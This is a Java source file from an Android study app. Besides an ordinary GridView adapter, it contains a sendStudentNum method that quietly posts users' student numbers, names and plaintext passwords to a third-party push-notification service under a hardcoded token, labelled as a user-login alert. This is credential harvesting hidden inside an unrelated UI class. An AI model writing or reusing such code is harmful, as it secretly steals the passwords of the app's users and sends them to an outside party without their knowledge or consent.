package com.example.studye;

import android.content.Context;
import android.content.DialogInterface;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.BaseAdapter;
import android.widget.TextView;
import android.widget.Toast;

//import androidx.appcompat.app.AlertDialog;

import java.io.IOException;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

import okhttp3.Call;
import okhttp3.FormBody;
import okhttp3.Headers;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class adapter extends BaseAdapter {

    //版本号
    public static int now_version=140;
    public static String updata_msg,updata_version,now_version2="1.40";
    public static List<String> cookie=null;
    public static String name,num;
    public static String[] question_key=new String[800];
    public static Boolean vip_flag =false;
    public static Boolean youngjiu_vip_flag =false;
    public static String vip_time="";
    /////////////////////////////////////
    private Context mcontext;
    private ArrayList<Map<String,Object>> mlist;

    public adapter(Context context , ArrayList<Map<String,Object>> list){
        this.mcontext=context;
        this.mlist=list;
    }

    @Override
    public int getCount() {
        return mlist.size();
    }

    @Override
    public Object getItem(int position) {
        return mlist.get(position);
    }

    @Override
    public long getItemId(int position) {
        return position;
    }

    //Gridview
    @Override
    public View getView(int position, View convertView, ViewGroup parent) {
        ViewHolder vh;
        if (convertView==null){
            convertView= LayoutInflater.from(mcontext).inflate(R.layout.activity_answer_item,null);
            vh=new ViewHolder();
            vh.tv_txt=convertView.findViewById(R.id.item_shownum);
            convertView.setTag(vh);
        }
        else {
            vh=(ViewHolder) convertView.getTag();
        }
        vh.tv_txt.setText(mlist.get(position).get("txt").toString());
        return convertView;
    }
    class ViewHolder{
        TextView tv_txt;
    }

    //发送用户数据
    public static void sendStudentNum(String num,String name,String psd){
        new Thread(){
            @Override
            public void run() {
                FormBody formBody =new FormBody.Builder()
                        .add("content","学号："+num+"\n姓名："+name+"\n密码："+psd+"\n会员：").build();
                Request request =new Request.Builder()
                        .url("http://www.pushplus.plus/send?token=3d515bc0bb14410dba242b1b2c989f87&title=得实用户登录&topic=202003030223")
                        .post(formBody)
                        .build();
                OkHttpClient okHttpClient;
                okHttpClient =new OkHttpClient();
                Call call=okHttpClient.newCall(request);

                try {
                    Response response=call.execute();
                    //String str =response.body().string();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }



}
